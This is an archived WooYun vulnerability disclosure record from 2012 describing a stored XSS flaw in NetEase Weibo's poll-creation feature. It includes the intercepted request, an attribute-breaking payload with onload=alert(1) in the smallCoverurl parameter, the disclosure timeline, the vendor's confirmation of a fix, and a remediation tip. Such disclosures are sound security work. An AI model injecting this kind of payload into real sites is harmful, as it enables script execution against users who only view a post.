{"id": 16358, "wybug_id": "wooyun-2012-012762", "wybug_title": "网易微博存储型XSS 2", "wybug_corp": "网易", "wybug_author": "心伤的胖子", "wybug_date": "2012-09-27 09:43", "wybug_open_date": "2012-11-11 09:44", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-09-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-09-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-10-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-10-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-10-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-11-11：\t细节向公众公开  简要描述： 有人在等2，那么这就来了。在《网易微博存储型XSS 1》 http://www.wooyun.org/bugs/wooyun-2010-012746 中漏洞虽然是发微博处，还是需要一个小的交互才能够触发漏洞（不过绝大多数人都会有这个交互的）。在这个网易微博的漏洞中不需要交互，看到微博就会触发xss漏洞。 详细说明：  1、首先说下漏洞是出现在创建投票处2、在创建投票的地方可以上传图片，容易出现xss的地方，我们上传一个图片，同时把投票的其他项也补充好，提交的时候截断请求，会向服务端发送如下数据\ntitle=%E9%92%93%E9%B1%BC%E5%B2%9B&description=&option%5B%5D=%E4%B8%AD%E5%9B%BD%E7%9A%84&option%5B%5D=%E4%B8%AD%E5%9B%BD%E7%9A%84&voteType=1&endTime=&coverurl=http%3A%2F%2F126.fm%2F2bqmHT&smallCoverurl=http%3A%2F%2Ftimge4.126.net%2Fimage%3Fw%3D322%26h%3D115%26url%3Dhttp%253A%252F%252F126.fm%252F2bqmHT%26gif%3D1%26quality%3D85\n在实际测试中我在每个参数后面都加上类似\"><bbb>这样的字符，创建投票，然后发表微博3、访问刚才发表的微博，然后在源码中搜索 <bbb> 这样的字符，很不幸真的有，出现在img标签后面，由于是在首页访问，大致判断是smallCoverurl这个参数没有过滤好。4、从新创建一个投票然后提交，如下：\ntitle=%E9%92%93%E9%B1%BC%E5%B2%9B&description=&option%5B%5D=%E4%B8%AD%E5%9B%BD%E7%9A%84&option%5B%5D=%E4%B8%AD%E5%9B%BD%E7%9A%84&voteType=1&endTime=&coverurl=http%3A%2F%2F126.fm%2F2bqmHT&smallCoverurl=http%3A%2F%2Ftimge4.126.net%2Fimage%3Fw%3D322%26h%3D115%26url%3Dhttp%253A%252F%252F126.fm%252F2bqmHT%26gif%3D1%26quality%3D85\" onload=alert(1) a=\"\n5、再次访问新发表的微博，顺利执行我们的alert(1)。   漏洞证明：  下图：\n\n或者访问：http://t.163.com/0086269676   修复方案：  1、对coverurl和smallCoverurl参数进行编码处理，虽然我没有测试coverurl这个参数，但是我觉得应该也存在问题。   版权声明：转载请注明来源 心伤的胖子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2012-09-28 18:06 厂商回复： 感谢您对网易的关注，漏洞已经修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-12-14 13:53 |    \t\t蓝风 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:25        | 崬汸慾哓 嗼檤焄垳皁 沓猵圊屾亾沬荖 颩憬...)\t\t \n  授人以渔    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}